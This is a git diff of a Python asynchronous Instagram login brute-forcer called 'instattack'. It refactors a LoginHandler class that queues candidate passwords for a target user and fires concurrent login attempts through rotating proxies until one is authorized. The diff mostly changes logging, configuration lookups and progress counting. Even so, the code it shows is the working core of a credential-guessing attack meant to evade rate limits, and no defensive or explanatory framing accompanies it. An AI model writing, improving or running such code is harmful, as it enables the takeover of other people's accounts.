@@ -5,7 +5,7 @@ import aiohttp
 import aiojobs
 import collections
 
-from instattack import logger
+from instattack.src.base import HandlerMixin
 from instattack.src.utils import percentage
 
 from .models import InstagramResults
@@ -42,28 +42,31 @@ To remedy:
 """
 
 
-class LoginHandler(RequestHandler):
+class LoginHandler(RequestHandler, HandlerMixin):
 
     __name__ = 'Login Handler'
+    __logconfig__ = "login_attempts"
 
-    def __init__(self, config, proxy_handler, **kwargs):
-        super(LoginHandler, self).__init__(config, proxy_handler, **kwargs)
+    def __init__(self, config, proxy_handler, user=None, start_event=None, stop_event=None):
+        super(LoginHandler, self).__init__(config, proxy_handler)
 
-        self.limit = config.get('limit')
-        self.batch_size = config['batch_size']
-        self.attempt_batch_size = config['attempts']['batch_size']
+        self.user = user
+        self.start_event = start_event
+        self.stop_event = stop_event
 
-        self.log_login = config['log']
+        self.limit = config['login']['limit']
+        self.batch_size = config['login']['batch_size']
+        self.attempt_batch_size = config['login']['attempts']['batch_size']
 
         self.passwords = asyncio.Queue()
 
         self.num_completed = 0
-        self.login_index = 0  # Index for the current password and attempts per password.
+        self.num_passwords = 0  # Index for the current password and attempts per password.
         self.attempts_count = collections.Counter()  # Indexed by Password
         self.proxies_count = collections.Counter()  # Indexed by Proxy Unique ID
 
     async def run(self, loop):
-        log = logger.get_async(self.__name__, subname='attack')
+        log = self.create_logger('attack', ignore_config=True)
         await log.start('Running Login Handler')
 
         await self.prepopulate(loop)
@@ -72,23 +75,26 @@ class LoginHandler(RequestHandler):
         return results
 
     async def attempt_single_login(self, loop, password):
-        log = logger.get_async(self.__name__, subname='attack')
+        log = self.create_logger('attack', ignore_config=True)
         await log.start('Starting Single Login')
 
         await self.passwords.put(password)
+        self.num_passwords = 1
+
         results = await self.attack(loop)
         return results.results[0]
 
     async def attack(self, loop):
-        log = logger.get_async(self.__name__, subname='attack')
-        log.start('Starting Attack')
+        log = self.create_logger('attack', ignore_config=True)
+
+        await log.start('Starting Attack')
 
         scheduler = await aiojobs.create_scheduler(limit=100, exception_handler=None)
         results = await self.attempt_login(loop, scheduler)
         return results
 
     async def prepopulate(self, loop):
-        log = logger.get_async(self.__name__, subname='prepopulate')
+        log = self.create_logger('prepopulate', ignore_config=True)
 
         message = f'Generating All Attempts for User {self.user.username}.'
         if self.limit:
@@ -99,6 +105,7 @@ class LoginHandler(RequestHandler):
         if len(passwords) == 0:
             raise NoPasswordsError()
 
+        self.num_passwords = len(passwords)
         for password in passwords:
             await self.passwords.put(password)
 
@@ -116,7 +123,6 @@ class LoginHandler(RequestHandler):
         while not self.passwords.empty():
             password = await self.passwords.get()
             if password:
-                self.login_index += 1
                 yield self.attempt_with_password(loop, session, password, scheduler)
 
     async def attempt_login(self, loop, scheduler):
@@ -128,8 +134,7 @@ class LoginHandler(RequestHandler):
         using different proxies, so this is the top level of a tree of nested
         concurrent IO operations.
         """
-        log = logger.get_async(self.__name__, subname='attempt_login')
-        log.disable_on_false(self.log_login)
+        log = self.create_logger('attempt_login')
 
         results = InstagramResults(results=[])
 
@@ -158,7 +163,7 @@ class LoginHandler(RequestHandler):
                 # because the login_tasks are generated so quickly, we need a more
                 # sustainable way of doing this.
                 await log.success(
-                    f'Percent Done: {percentage(self.num_completed, self.login_index)}')
+                    f'Percent Done: {percentage(self.num_completed, self.num_passwords)}')
 
                 if result.authorized:
                     asyncio.shield(scheduler.spawn(
@@ -189,7 +194,7 @@ class LoginHandler(RequestHandler):
         is found since this will generate relatively quickly and the coroutines
         have not been run yet.
         """
-        log = logger.get_async(self.__name__, subname="generate_login_attempts")
+        log = self.create_logger('generate_login_attempts')
 
         while True:
             proxy = await self.proxy_handler.pool.get()
@@ -216,7 +221,7 @@ class LoginHandler(RequestHandler):
         current fetches to the batch_size.  Will return when it finds the first
         request that returns a valid result.
         """
-        log = logger.get_async(self.__name__, subname="attempt_with_password")
+        log = self.create_logger('attempt_with_password')
 
         # TODO:  We should figure out a way to allow proxies to repopulate and wait
         # on them for large number of password requests.  We don't want to bail when
